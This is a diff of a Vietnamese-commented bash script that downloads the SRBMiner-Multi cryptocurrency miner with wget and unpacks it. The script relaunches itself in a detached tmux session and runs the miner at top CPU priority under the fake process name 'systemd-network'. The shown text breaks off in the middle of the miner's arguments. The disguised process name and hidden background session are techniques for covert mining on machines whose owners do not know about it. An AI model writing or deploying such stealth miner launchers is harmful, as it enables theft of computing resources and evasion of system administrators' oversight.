@@ -1,21 +1,36 @@
-tmux
-
 #!/bin/bash
 
+# Kiểm tra xem đang chạy trong tmux hay không
+if [ -z "$TMUX" ]; then
+  echo "Chạy trong tmux..."
+  tmux new-session -d -s mining "bash $0"
+  exit
+fi
+
+# Cấu hình số luồng CPU và tên miner ngẫu nhiên
 THREADS=3
 MINER_NAME=$(shuf -i 10000000-99999999 -n 1)
 
+# Tạo thư mục nếu chưa có
 mkdir -p neable
 cd neable
 
-# Kiểm tra đúng file SRBMiner có tồn tại không trước khi tải
+# Kiểm tra xem file SRBMiner đã tồn tại chưa
 if [ ! -f SRBMiner-Multi-2-8-1-Linux.tar.gz ]; then
+  echo "Tải xuống SRBMiner..."
   wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.1/SRBMiner-Multi-2-8-1-Linux.tar.gz
-  tar -xf SRBMiner-Multi-2-8-1-Linux.tar.gz
+  if [ $? -ne 0 ]; then
+    echo "❌ Lỗi: Không thể tải SRBMiner!"
+    exit 1
+  fi
+  tar -xf SRBMiner-Multi-2-8-1-Linux.tar.gz || { echo "❌ Lỗi giải nén!"; exit 1; }
 fi
 
-cd SRBMiner-Multi-2-8-1
+# Chuyển vào thư mục miner
+cd SRBMiner-Multi-2-8-1 || { echo "❌ Lỗi: Không tìm thấy thư mục miner!"; exit 1; }
 
+# Chạy miner
+echo "⛏️ Bắt đầu đào với $THREADS luồng CPU..."
 exec -a systemd-network nice -n -20 ./SRBMiner-MULTI \
   --disable-gpu \
   --algorithm randomx \
